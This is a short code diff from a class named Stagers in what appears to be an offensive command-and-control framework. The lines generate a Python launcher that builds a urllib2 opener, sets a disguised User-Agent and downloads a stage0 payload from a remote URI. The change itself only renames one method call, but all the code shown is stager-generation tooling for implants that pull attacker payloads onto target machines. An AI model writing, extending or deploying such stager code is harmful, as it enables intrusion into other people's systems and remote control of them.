@@ -260,7 +260,7 @@ class Stagers:
 
         
         launcherBase += "o=urllib2.OpenerDirector()\n"
-        launcherBase += "o.addHandler(" + handler + ")\n"
+        launcherBase += "o.add_handler(" + handler + ")\n"
         launcherBase += "UA='%s'\n" % (userAgent)
         launcherBase += "o.addheaders=[('User-Agent',UA)]\n"
         launcherBase += "a=o.open('%s').read()\n" % (stage0uri)
